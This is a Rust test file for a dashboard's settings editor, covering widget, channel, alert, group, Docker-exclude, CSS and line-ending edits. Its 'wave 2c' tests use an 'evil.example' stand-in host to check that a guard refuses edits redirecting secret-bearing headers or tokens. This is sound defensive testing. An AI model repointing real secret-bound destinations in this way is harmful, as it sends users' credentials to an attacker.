/// Renaming a widget a rule watches (owner decision Y7: ids stay editable):
/// the rule follows the new id, its formatting kept, and the revision note
/// says so. Before this, the save was refused with `alert "watch-w1":
/// unknown widget "w1"`.
#[test]
fn renaming_a_widget_moves_the_rules_that_watch_it() {
    let item = json!({"id": "w2", "type": "custom-api", "url": "http://w.example/api", "fields": {"v": "v"}});
    let req = list_req("edit", Some(json!("w1")), Some(item), None);
    let d = ops::list_action(&cur(USED), &ops::WIDGETS, &req)
        .and_then(ops::precheck)
        .unwrap();
    let c = parse_ok(&d.text);
    assert_eq!(c.widgets[0].id, "w2");
    assert_eq!(c.alerts[0].widget.as_deref(), Some("w2"));
    assert!(
        d.text.contains("widget = \"w2\"   # keep this comment"),
        "{}",
        d.text
    );
    assert_eq!(d.note, "widgets: renamed w1 to w2 (rules watch-w1)");
    assert_eq!(changes(USED, &d.text), (2, 2));
}

/// An entry's check (`alert "x": …`, `channel "x" (…): …`) lands on the
/// form field in the form's words; the entry's own name is not taken for a
/// field (SET-55).
#[test]
fn entry_checks_are_said_in_the_forms_words() {
    let host = |name: &str, extra: J| {
        let mut r = json!({"name": name, "type": "host", "metric": "memory", "channels": []});
        for (k, v) in extra.as_object().unwrap() {
            r[k] = v.clone();
        }
        let req = list_req("add", None, Some(r), None);
        ops::list_action(&cur(FIXTURE), &ops::ALERTS, &req).and_then(ops::precheck)
    };
    for name in ["m", "disk"] {
        for extra in [json!({}), json!({"above": 1, "below": 2})] {
            let e = host(name, extra).unwrap_err();
            assert_eq!(e.body["field"], "above", "{name}: {}", e.body);
            assert_eq!(e.body["error"], "Set exactly one of: Above or Below.");
            assert!(e.body["line"].is_null());
        }
    }
    let req = list_req(
        "add",
        None,
        Some(
            json!({"name": "s", "type": "slack", "webhook_url_env": "RH_A", "webhook_url_file": "/data/secrets/a"}),
        ),
        None,
    );
    let e = ops::channel_action(&cur(FIXTURE), &req)
        .and_then(ops::precheck)
        .unwrap_err();
    assert_eq!(e.body["field"], "webhook_url_env", "{}", e.body);
    assert_eq!(
        e.body["error"],
        "Set exactly one of: Webhook URL variable or Webhook URL file."
    );
    assert_eq!(
        ops::strip_owner(r#"alert "a \"b\"": `on` is empty"#),
        Some("`on` is empty")
    );
    assert_eq!(
        ops::strip_owner(r#"channel "x" (slack): timeout must be between 1s and 60s"#),
        Some("timeout must be between 1s and 60s")
    );
    assert_eq!(ops::strip_owner("duplicate widget id \"x\""), None);
    assert_eq!(ops::sentence("`on` is empty"), "“Fire on” is empty.");
    assert_eq!(
        ops::sentence("timeout must be between 1s and 60s"),
        "Use a value from 1s to 60s."
    );
}

const KEEPS: &str = r#"[[widgets]]
id = "w-rich"   # rich
type = "custom-api"
url = "http://w.example/api"
method = "post"
body = '{"q":1}'
output = "json"
enabled = true
template = "{{a}}"
status = { field = "a", ok = ["200", 1, true] }
[widgets.headers]
X-Plain = "plainvalue"
[widgets.fields]
a = "ok"
[[widgets.rows]]
label = "L"
value = "{{a}}"

[channels.hook-h]
type = "webhook"
url = "http://w.example/hook"
timeout = "7s"
body = '{"text": "{{message}}"}'
[channels.hook-h.headers]
X-Plain = "plainvalue123"

[channels.tg2]
type = "telegram"
token_env = "RH_TG"
chat_id = "-100999"
api_base = "http://tg.example"

[[alerts]]
name = "w-eq"
type = "widget"
widget = "w-rich"
field = "a"
equals = "200"
enabled = true

[[alerts]]
name = "logs"
type = "log_match"
pattern = "error"
containers = ["web-*"]
exclude = ["web-test"]
on_error = false
"#;

/// The edit semantics every dialog relies on (review item 1): an edited
/// entry is patched with the keys the item has; an absent key is kept as it
/// is in the file, `null` removes it. So a save that leaves out what the
/// form does not show (header values, a body, `api_base`, `output`) keeps it.
#[test]
fn an_edit_keeps_every_key_it_does_not_send() {
    // `on_error = false` on a log rule would not load: drop it here.
    let text = KEEPS.replace("on_error = false\n", "");
    parse_ok(&text);
    // Change one field of each kind of entry.
    let req = list_req(
        "edit",
        Some(json!("hook-h")),
        Some(json!({"name": "hook-h", "type": "webhook", "timeout": "8s"})),
        None,
    );
    let d = ops::channel_action(&cur(&text), &req)
        .and_then(ops::precheck)
        .unwrap();
    assert_eq!(changes(&text, &d.text), (1, 1), "{}", d.text);
    assert!(
        d.text.contains("timeout = \"8s\"")
            && d.text.contains("X-Plain = \"plainvalue123\"")
            && d.text.contains("body = '{\"text\"")
    );
    let req = list_req(
        "edit",
        Some(json!("tg2")),
        Some(json!({"name": "tg2", "type": "telegram", "timeout": "5s"})),
        None,
    );
    let d = ops::channel_action(&cur(&text), &req)
        .and_then(ops::precheck)
        .unwrap();
    assert!(
        d.text.contains("api_base = \"http://tg.example\"")
            && d.text.contains("chat_id = \"-100999\"")
    );
    let req = list_req(
        "edit",
        Some(json!("w-rich")),
        Some(
            json!({"id": "w-rich", "type": "custom-api", "url": "http://w.example/api", "title": "T"}),
        ),
        None,
    );
    let d = ops::list_action(&cur(&text), &ops::WIDGETS, &req)
        .and_then(ops::precheck)
        .unwrap();
    assert_eq!(changes(&text, &d.text), (1, 0), "{}", d.text);
    for kept in [
        "method = \"post\"",
        "body = '{\"q\":1}'",
        "output = \"json\"",
        "enabled = true",
        "ok = [\"200\", 1, true]",
        "X-Plain = \"plainvalue\"",
        "[[widgets.rows]]",
        "template = \"{{a}}\"",
        "id = \"w-rich\"   # rich",
    ] {
        assert!(d.text.contains(kept), "lost {kept}: {}", d.text);
    }
    // `null` still removes, and an edit with nothing new writes nothing.
    let req = list_req(
        "edit",
        Some(json!("w-eq")),
        Some(json!({"name": "w-eq", "type": "widget", "enabled": null})),
        None,
    );
    let d = ops::list_action(&cur(&text), &ops::ALERTS, &req).unwrap();
    assert_eq!(changes(&text, &d.text), (0, 1));
    for (spec, id, item) in [
        (
            &ops::ALERTS,
            "w-eq",
            json!({"name": "w-eq", "type": "widget"}),
        ),
        (
            &ops::ALERTS,
            "logs",
            json!({"name": "logs", "type": "log_match"}),
        ),
        (
            &ops::WIDGETS,
            "w-rich",
            json!({"id": "w-rich", "type": "custom-api", "url": "http://w.example/api"}),
        ),
    ] {
        let req = list_req("edit", Some(json!(id)), Some(item), None);
        assert_eq!(
            ops::list_action(&cur(&text), spec, &req).unwrap().text,
            text,
            "{id}"
        );
    }
    for (id, ty) in [("hook-h", "webhook"), ("tg2", "telegram")] {
        let req = list_req(
            "edit",
            Some(json!(id)),
            Some(json!({"name": id, "type": ty})),
            None,
        );
        assert_eq!(
            ops::channel_action(&cur(&text), &req).unwrap().text,
            text,
            "{id}"
        );
    }
    // An add is still whole: a missing key is simply not written.
    let req = list_req(
        "add",
        None,
        Some(json!({"name": "n", "type": "slack", "webhook_url_env": "RH_S"})),
        None,
    );
    let d = ops::channel_action(&cur(&text), &req).unwrap();
    assert!(d.text.contains("[channels.n]"));
}

/// Review item 6: a widget's field-name error is about the Fields list, in
/// plain words, on save and on Fetch now alike.
#[test]
fn widget_field_errors_land_on_the_fields_list() {
    let item = json!({"id": "w", "type": "custom-api", "url": "http://w.example/", "fields": {"bad name": "x"}});
    let req = list_req("add", None, Some(item.clone()), None);
    let e = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req)
        .and_then(ops::precheck)
        .unwrap_err();
    assert_eq!(e.body["field"], "fields", "{}", e.body);
    assert!(
        e.body["error"]
            .as_str()
            .unwrap()
            .starts_with("Field name \"bad name\""),
        "{}",
        e.body
    );
    let e = ops::preview_widget(&item).unwrap_err();
    assert_eq!(e.body["field"], "fields", "{}", e.body);
    assert!(
        !e.body["error"].as_str().unwrap().contains("widget \""),
        "{}",
        e.body
    );
    let item = json!({"id": "w", "type": "custom-api", "url": "http://w.example/", "template": "{{nope}}"});
    let e = ops::preview_widget(&item).unwrap_err();
    assert_eq!(e.body["field"], "template");
    assert!(
        e.body["error"]
            .as_str()
            .unwrap()
            .contains("(add it on the Fields tab)"),
        "{}",
        e.body
    );
}

// ------------------------------------------------------------ wave 2c

/// A patch that leaves the secret keys out (as an edit dialog does) and
/// moves the destination: the merge keeps the secret references, so the
/// guard must refuse the result. `guard.rs` is the judge; these pin that
/// the patch semantics never hand it something it cannot see.
#[test]
fn a_patch_without_the_secret_keys_cannot_move_a_bound_destination() {
    let refused = |old: &str, d: Result<store::Draft, store::ApiError>| {
        let d = d.expect("the patch itself applies");
        assert!(d.text != old, "the destination moved in the merged text");
        let e = guard::check(old, &d.text, sec()).expect_err("the guard refuses");
        assert!(e.0.contains(guard::SECRET_BINDING_RULE), "{}", e.0);
    };
    // A widget with headers_env: a new URL only.
    let w_env = "[[widgets]]\nid = \"a\"\ntype = \"custom-api\"\nurl = \"http://svc/api\"\nheaders_env = { Authorization = \"SVC_TOKEN\" }\n";
    let r = list_req(
        "edit",
        Some(json!("a")),
        Some(json!({"id": "a", "type": "custom-api", "url": "http://evil.example/"})),
        None,
    );
    let d = ops::list_action(&cur(w_env), &ops::WIDGETS, &r);
    assert!(
        d.as_ref().unwrap().text.contains("headers_env"),
        "kept by the patch"
    );
    refused(w_env, d);
    // A widget with headers_file.
    let w_file = "[[widgets]]\nid = \"b\"\ntype = \"custom-api\"\nurl = \"http://svc/api\"\nheaders_file = { Authorization = \"/data/secrets/svc\" }\n";
    let r = list_req(
        "edit",
        Some(json!("b")),
        Some(json!({"id": "b", "type": "custom-api", "url": "http://evil.example/"})),
        None,
    );
    refused(w_file, ops::list_action(&cur(w_file), &ops::WIDGETS, &r));
    // A webhook channel with headers_env: a new plain URL.
    let wh = "[channels.w]\ntype = \"webhook\"\nurl = \"http://hook/\"\nheaders_env = { Authorization = \"HOOK_AUTH\" }\n";
    let r = list_req(
        "edit",
        Some(json!("w")),
        Some(json!({"name": "w", "type": "webhook", "url": "http://evil.example/"})),
        None,
    );
    let d = ops::channel_action(&cur(wh), &r);
    assert!(
        d.as_ref().unwrap().text.contains("HOOK_AUTH"),
        "kept by the patch"
    );
    refused(wh, d);
    // A Telegram channel with api_base: another token sent to that host.
    let tg = "[channels.tg]\ntype = \"telegram\"\ntoken_env = \"RH_TG_TOKEN\"\nchat_id = 1\napi_base = \"http://tg.example\"\n";
    let r = list_req(
        "edit",
        Some(json!("tg")),
        Some(json!({"name": "tg", "type": "telegram", "token_env": "RH_OTHER_TOKEN"})),
        None,
    );
    let d = ops::channel_action(&cur(tg), &r);
    assert!(
        d.as_ref()
            .unwrap()
            .text
            .contains("api_base = \"http://tg.example\""),
        "kept by the patch"
    );
    refused(tg, d);
}

/// The same four through the API: 403, nothing written.
#[tokio::test]
async fn bound_destinations_are_refused_through_the_api_too() {
    for (cfg, path, body) in [
        (
            "[[widgets]]\nid = \"a\"\ntype = \"custom-api\"\nurl = \"http://svc/api\"\nheaders_env = { Authorization = \"SVC_TOKEN\" }\n",
            "widgets",
            json!({"action": "edit", "id": "a", "item": {"id": "a", "type": "custom-api", "url": "http://evil.example/"}}),
        ),
        (
            "[channels.tg]\ntype = \"telegram\"\ntoken_env = \"RH_TG_TOKEN\"\nchat_id = 1\napi_base = \"http://tg.example\"\n",
            "channels",
            json!({"action": "edit", "id": "tg", "item": {"name": "tg", "type": "telegram", "token_env": "RH_OTHER_TOKEN"}}),
        ),
    ] {
        let (dir, st) = state_with(Some(cfg));
        let mut b = body;
        b["base_hash"] = J::String(hash(cfg));
        let (status, v) = post(&st, path, b).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{v}");
        assert_eq!(v["locked"], true);
        assert_eq!(file(&dir), cfg, "nothing written");
        let _ = std::fs::remove_dir_all(&dir);
    }
}

#[test]
fn groups_one_at_a_time_keep_what_the_form_does_not_show() {
    let text = "# groups\n[[groups]]\nname = \"media\"\ntitle = \"Media\"\ncolumns = 3\nlayout = \"list\" # kept\n\n[[groups]]\nname = \"tools\"\n";
    // Edit: only the changed field; columns, layout and the comment stay.
    let r = list_req(
        "edit",
        Some(json!("media")),
        Some(json!({"name": "media", "collapsed": true})),
        None,
    );
    let d = ops::list_action(&cur(text), &ops::GROUPS, &r).unwrap();
    assert!(
        d.text.contains("columns = 3") && d.text.contains("layout = \"list\" # kept"),
        "{}",
        d.text
    );
    assert!(d.text.contains("collapsed = true") && d.text.contains("title = \"Media\""));
    assert_eq!(changes(text, &d.text), (1, 0), "one line added");
    // An unchanged edit is the same text.
    let r = list_req(
        "edit",
        Some(json!("media")),
        Some(json!({"name": "media"})),
        None,
    );
    assert_eq!(
        ops::list_action(&cur(text), &ops::GROUPS, &r).unwrap().text,
        text
    );
    // Add, rename onto an existing name, reorder, delete.
    let r = list_req(
        "add",
        None,
        Some(json!({"name": "new", "title": null, "hide": true})),
        None,
    );
    let d = ops::list_action(&cur(text), &ops::GROUPS, &r).unwrap();
    assert!(
        d.text
            .ends_with("[[groups]]\nname = \"new\"\nhide = true\n"),
        "{}",
        d.text
    );
    parse_ok(&d.text);
    let r = list_req("add", None, Some(json!({"name": "media"})), None);
    let e = ops::list_action(&cur(text), &ops::GROUPS, &r).unwrap_err();
    assert_eq!(
        (e.status, e.body["field"].as_str()),
        (StatusCode::UNPROCESSABLE_ENTITY, Some("name"))
    );
    let r = list_req(
        "edit",
        Some(json!("tools")),
        Some(json!({"name": "media"})),
        None,
    );
    let e = ops::list_action(&cur(text), &ops::GROUPS, &r).unwrap_err();
    assert!(
        e.body["error"]
            .as_str()
            .unwrap()
            .contains("already in the list"),
        "{}",
        e.body
    );
    let r = list_req("add", None, Some(json!({"name": " "})), None);
    assert_eq!(
        ops::list_action(&cur(text), &ops::GROUPS, &r)
            .unwrap_err()
            .body["field"],
        "name"
    );
    let r = list_req("reorder", None, None, Some(json!(["tools", "media"])));
    let d = ops::list_action(&cur(text), &ops::GROUPS, &r).unwrap();
    assert!(
        d.text.find("tools").unwrap() < d.text.find("media").unwrap()
            && d.text.contains("layout = \"list\" # kept")
    );
    let r = list_req("delete", Some(json!("tools")), None, None);
    let d = ops::list_action(&cur(text), &ops::GROUPS, &r).unwrap();
    assert!(!d.text.contains("tools") && d.text.starts_with("# groups\n"));
}

#[test]
fn exclude_patterns_one_at_a_time() {
    let text = "[docker]\nexclude = [\"a-*\", \"b\"] # mine\nsocket = \"/x\"\n";
    let req = |action: &str, id: Option<J>, p: Option<&str>| {
        list_req(action, id, p.map(|p| json!({"pattern": p})), None)
    };
    let d = ops::exclude_action(&cur(text), &req("add", None, Some(" c? "))).unwrap();
    assert_eq!(
        d.text,
        "[docker]\nexclude = [\"a-*\", \"b\", \"c?\"] # mine\nsocket = \"/x\"\n"
    );
    let d = ops::exclude_action(&cur(text), &req("edit", Some(json!(1)), Some("bb"))).unwrap();
    assert_eq!(
        d.text,
        "[docker]\nexclude = [\"a-*\", \"bb\"] # mine\nsocket = \"/x\"\n"
    );
    assert_eq!(
        ops::exclude_action(&cur(text), &req("edit", Some(json!(1)), Some("b")))
            .unwrap()
            .text,
        text,
        "unchanged"
    );
    let d = ops::exclude_action(&cur(text), &req("delete", Some(json!(0)), None)).unwrap();
    assert_eq!(
        d.text,
        "[docker]\nexclude = [\"b\"] # mine\nsocket = \"/x\"\n"
    );
    let d = ops::exclude_action(&cur(&d.text), &req("delete", Some(json!(0)), None)).unwrap();
    assert_eq!(
        d.text, "[docker]\nsocket = \"/x\"\n",
        "the last one takes the key"
    );
    // Into a file without [docker].
    let d = ops::exclude_action(
        &cur("[page]\ntitle = \"x\"\n"),
        &req("add", None, Some("tmp-*")),
    )
    .unwrap();
    assert!(
        d.text.contains("[docker]\nexclude = [\"tmp-*\"]"),
        "{}",
        d.text
    );
    parse_ok(&d.text);
    // Plain errors on the field.
    for (r, msg) in [
        (
            req("add", None, Some("b")),
            "This pattern is already in the list.",
        ),
        (
            req("edit", Some(json!(0)), Some("b")),
            "This pattern is already in the list.",
        ),
        (req("add", None, Some("  ")), "Required."),
    ] {
        let e = ops::exclude_action(&cur(text), &r).unwrap_err();
        assert_eq!(
            (e.body["error"].as_str(), e.body["field"].as_str()),
            (Some(msg), Some("pattern"))
        );
    }
    assert_eq!(
        ops::exclude_action(&cur(text), &req("delete", Some(json!(9)), None))
            .unwrap_err()
            .status,
        StatusCode::NOT_FOUND
    );
}

#[test]
fn exclude_patterns_follow_a_multi_line_array() {
    let text = "[docker]\nexclude = [\n  \"ci-*\",   # ci\n  # dev boxes\n  \"dev-*\",  # dev\n  \"tmp\",    # tmp\n]\nstandalone_group = \"x\"\n";
    let req = |action: &str, id: Option<J>, p: Option<&str>| {
        list_req(action, id, p.map(|p| json!({"pattern": p})), None)
    };
    let del = |t: &str, i: u64| {
        ops::exclude_action(&cur(t), &req("delete", Some(json!(i)), None))
            .unwrap()
            .text
    };
    // The first goes with its own comment; the bracket line stays clean.
    assert_eq!(
        del(text, 0),
        "[docker]\nexclude = [\n  # dev boxes\n  \"dev-*\",  # dev\n  \"tmp\",    # tmp\n]\nstandalone_group = \"x\"\n"
    );
    // A middle one goes with the comment above it and the one after it.
    assert_eq!(
        del(text, 1),
        "[docker]\nexclude = [\n  \"ci-*\",   # ci\n  \"tmp\",    # tmp\n]\nstandalone_group = \"x\"\n"
    );
    // The last one: the one before keeps its comment.
    assert_eq!(
        del(text, 2),
        "[docker]\nexclude = [\n  \"ci-*\",   # ci\n  # dev boxes\n  \"dev-*\",  # dev\n]\nstandalone_group = \"x\"\n"
    );
    // Add: on a line of its own, indented as the others, after the last
    // value's comment.
    let d = ops::exclude_action(&cur(text), &req("add", None, Some("new-*"))).unwrap();
    assert_eq!(
        d.text,
        "[docker]\nexclude = [\n  \"ci-*\",   # ci\n  # dev boxes\n  \"dev-*\",  # dev\n  \"tmp\",    # tmp\n  \"new-*\",\n]\nstandalone_group = \"x\"\n"
    );
    assert_eq!(
        parse_ok(&d.text).docker.exclude,
        ["ci-*", "dev-*", "tmp", "new-*"]
    );
    // Delete what was added: the file as it was.
    assert_eq!(del(&d.text, 3), text);
    // No trailing comma, no comments.
    let plain = "[docker]\nexclude = [\n    \"a\",\n    \"b\"\n]\n";
    let d = ops::exclude_action(&cur(plain), &req("add", None, Some("c"))).unwrap();
    assert_eq!(
        d.text,
        "[docker]\nexclude = [\n    \"a\",\n    \"b\",\n    \"c\"\n]\n"
    );
    assert_eq!(del(&d.text, 2), plain);
    assert_eq!(del(plain, 0), "[docker]\nexclude = [\n    \"b\"\n]\n");
    // A pattern with a control character is refused on its field.
    for p in ["a\nb", "a\tb", "a\u{7f}"] {
        let e = ops::exclude_action(&cur(text), &req("add", None, Some(p))).unwrap_err();
        assert_eq!(e.body["field"], "pattern", "{p:?}");
        let e = ops::exclude_action(&cur(text), &req("edit", Some(json!(0)), Some(p))).unwrap_err();
        assert_eq!(e.body["field"], "pattern", "{p:?}");
    }
}

#[tokio::test]
async fn docker_and_groups_routes_take_one_entry_or_the_whole_list() {
    let cfg = "[docker]\nexclude = [\"a\"]\n\n[[groups]]\nname = \"g\"\ncolumns = 2\n";
    let (dir, st) = state_with(Some(cfg));
    let (s, v) = post(
        &st,
        "docker",
        json!({"base_hash": hash(cfg), "action": "add", "item": {"pattern": "b"}}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{v}");
    let now = file(&dir);
    assert!(now.contains("exclude = [\"a\", \"b\"]"));
    let (s, v) = post(&st, "groups", json!({"base_hash": hash(&now), "action": "edit", "id": "g", "item": {"name": "g", "title": "G"}})).await;
    assert_eq!(s, StatusCode::OK, "{v}");
    assert!(file(&dir).contains("columns = 2") && file(&dir).contains("title = \"G\""));
    // The old whole-list shapes are gone: refused, nothing written.
    let now = file(&dir);
    for (path, body) in [
        ("docker", json!({"base_hash": hash(&now), "exclude": ["a"]})),
        (
            "groups",
            json!({"base_hash": hash(&now), "groups": [{"name": "g"}]}),
        ),
    ] {
        let (s, _) = post(&st, path, body).await;
        assert_eq!(s, StatusCode::BAD_REQUEST, "{path}");
        assert_eq!(file(&dir), now, "{path}");
    }
    // A stale base is a 409 for the one-entry shape too.
    let (s, _) = post(
        &st,
        "groups",
        json!({"base_hash": hash(cfg), "action": "delete", "id": "g"}),
    )
    .await;
    assert_eq!(s, StatusCode::CONFLICT);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn general_and_override_check_links_and_lengths_on_their_fields() {
    let text = "[page]\nsearch_url = \"not checked while unchanged\"\n";
    let req = |v: J| ops::PatchReq {
        base_hash: "x".into(),
        values: v,
    };
    for (v, field) in [
        (json!({"search_url": "not a url"}), "search_url"),
        (
            json!({"search_url": "https://example.com/?q="}),
            "search_url",
        ),
        (json!({"title": "t".repeat(81)}), "title"),
    ] {
        let e = ops::general(&cur(text), &req(v)).unwrap_err();
        assert_eq!(
            (e.status, e.body["field"].as_str()),
            (StatusCode::UNPROCESSABLE_ENTITY, Some(field)),
            "{}",
            e.body
        );
    }
    let d = ops::general(&cur(text), &req(json!({"greeting": "Hi"}))).unwrap();
    assert!(
        d.text.contains("not checked while unchanged"),
        "a field the form did not send is left alone"
    );
    assert!(ops::general(
        &cur(text),
        &req(json!({"search_url": "https://example.com/?q={q}"}))
    )
    .is_ok());
    // Columns, layout and theme: still accepted from the API, kept by a
    // patch that does not name them.
    let old = "[page]\ncolumns = 3\nlayout = \"list\"\ntheme = \"ember\"\n";
    let d = ops::general(&cur(old), &req(json!({"show_stats": false}))).unwrap();
    assert!(d.text.starts_with(old), "{}", d.text);
    let ov = |set: J| ops::OverrideReq {
        base_hash: "x".into(),
        names: vec!["web".into()],
        set: Some(set),
        clear: vec![],
        remove: false,
    };
    let e = ops::container_override(&cur(""), &ov(json!({"url": "not a url"}))).unwrap_err();
    assert_eq!(e.body["field"], "url");
    let e = ops::container_override(&cur(""), &ov(json!({"order": 1.5}))).unwrap_err();
    assert_eq!(
        (e.body["field"].as_str(), e.body["error"].as_str()),
        (Some("order"), Some("Use a whole number."))
    );
    assert!(ops::container_override(&cur(""), &ov(json!({"url": "https://web.example/"}))).is_ok());
}

#[test]
fn css_warnings_name_the_new_token() {
    let w = ops::css_token_warnings(
        ":root{--ctl:#1;--pop:x}\n/* --glow: 1 */ a{color:var(--accent-bg)}",
    );
    assert_eq!(w.len(), 2, "{w:?}");
    assert!(w[0].contains("--ctl") && w[0].contains("--ctl-border"));
    assert!(w[1].contains("--pop") && w[1].contains("--shadow-2"));
    assert!(ops::css_token_warnings(":root{--ctl-border:#1;--fs-micro:1px}").is_empty());
    assert_eq!(ops::css_token_warnings(":root { --border : red }").len(), 1);
    assert!(ops::css_token_warnings(":root{--border:red;--line:red}").is_empty());
    for old in ["--border-2", "--accent-bg", "--glow", "--fs-label"] {
        assert_eq!(
            ops::css_token_warnings(&format!("a{{{old}: 1}}")).len(),
            1,
            "{old}"
        );
    }
}

#[tokio::test]
async fn saving_custom_css_reports_old_token_names() {
    let (dir, st) = state_with(Some(""));
    let (_, g) = get(&st, "appearance").await;
    let (s, v) = post(
        &st,
        "appearance",
        json!({"base_hash": g["hash"], "css": ":root{--ctl:red}"}),
    )
    .await;
    assert_eq!(s, StatusCode::OK);
    assert_eq!(v["warnings"].as_array().unwrap().len(), 1, "{v}");
    let (_, v) = post(
        &st,
        "appearance",
        json!({"base_hash": v["hash"], "css": ":root{--ctl:red}"}),
    )
    .await;
    assert_eq!(
        (
            v["unchanged"].as_bool(),
            v["warnings"].as_array().map(Vec::len)
        ),
        (Some(true), Some(1))
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[tokio::test]
async fn a_crlf_file_stays_crlf() {
    let crlf = |s: &str| s.replace('\n', "\r\n");
    let text = crlf("# mine\n[page]\ntitle = \"Lab\"\n\n[history]\nsample_interval = \"30s\"\n");
    let (dir, st) = state_with(Some(&text));
    // The raw editor sends LF (a browser's textarea does): one line changed.
    let edited = text.replace("\r\n", "\n").replace("Lab", "Home");
    let (s, v) = post(
        &st,
        "config",
        json!({"base_hash": hash(&text), "text": edited}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{v}");
    let now = file(&dir);
    assert_eq!(now, text.replace("Lab", "Home"));
    assert_eq!(v["hash"], hash(&now));
    // The same text again, LF: nothing to save.
    let (s, v) = post(
        &st,
        "config",
        json!({"base_hash": hash(&now), "text": now.replace("\r\n", "\n")}),
    )
    .await;
    assert_eq!((s, v["unchanged"].clone()), (StatusCode::OK, J::Bool(true)));
    // A form edit that adds lines: they are CRLF too.
    let (s, v) = post(
        &st,
        "general",
        json!({"base_hash": hash(&now), "page": {"greeting": "Hi"}}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{v}");
    let now = file(&dir);
    assert!(doc::is_crlf(&now), "{now:?}");
    assert!(now.contains("greeting = \"Hi\"\r\n"));
    // custom.css too.
    let css = crlf(":root {\n  --radius: 8px;\n}\n");
    std::fs::write(dir.join("custom.css"), &css).unwrap();
    let (_, g) = get(&st, "appearance").await;
    let (s, v) = post(
        &st,
        "appearance",
        json!({"base_hash": g["hash"], "css": css.replace("\r\n", "\n").replace("8px", "4px")}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{v}");
    let saved = std::fs::read_to_string(dir.join("custom.css")).unwrap();
    assert_eq!(saved, css.replace("8px", "4px"));
    assert_eq!(v["hash"], hash(&saved));
    // An LF file is left alone.
    assert_eq!(doc::keep_line_ends("a\nb\n", "a\nc\n".into()), "a\nc\n");
    assert_eq!(
        doc::keep_line_ends("a\r\nb\n", "a\nc\n".into()),
        "a\nc\n",
        "mixed: as sent"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn switches_off_then_on_give_back_the_file() {
    let sys = |t: &str, on: bool| {
        let r: ops::SystemReq =
            serde_json::from_value(json!({"base_hash": "x", "enabled": on})).unwrap();
        ops::system(&cur(t), &r).unwrap().text
    };
    let rec = |t: &str, on: bool| {
        let r: ops::PatchReq =
            serde_json::from_value(json!({"base_hash": "x", "history": {"enabled": on}})).unwrap();
        ops::history(&cur(t), &r).unwrap().text
    };
    let with_history = "[page]\ntitle = \"x\"\n\n[history]\nsample_interval = \"30s\"\n";
    for t in [FIXTURE, with_history, "[page]\ntitle = \"x\"\n"] {
        let off = sys(t, false);
        assert!(!parse_ok(&off).system.enabled);
        assert_eq!(sys(&off, true), t, "system off then on");
        let off = rec(t, false);
        assert!(off.contains("enabled = false"), "{off}");
        assert_eq!(rec(&off, true), t, "recording off then on");
    }
    // Written by hand with a comment: kept, switched on in place.
    let t = "[system]\nenabled = false # for now\n";
    assert_eq!(sys(t, true), "[system]\nenabled = true # for now\n");
    let t = "[history]\n# paused\nenabled = false\n";
    assert_eq!(rec(t, true), "[history]\n# paused\nenabled = true\n");
    // Already on: nothing changes.
    let t = "[system]\nenabled = true\n";
    assert_eq!(sys(t, true), t);
}
